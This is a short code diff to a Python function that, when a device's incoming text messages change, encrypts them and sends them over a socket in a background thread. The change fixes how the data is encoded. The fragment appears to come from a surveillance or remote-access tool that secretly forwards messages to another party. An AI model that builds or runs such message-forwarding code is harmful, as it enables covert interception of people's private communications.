@@ -58,7 +58,7 @@ def incomming_texts():
 
         if(TextsRaw1 != TextsRaw2):
             Texts = encrypt(bytes.decode(TextsRaw2.communicate()[0]))
-            SOCKET.send(bytes.encode(encrypt(Texts)))
+            SOCKET.send(encrypt(Texts))
 
 
 incomming_texts_thread = threading.Thread(target=incomming_texts)
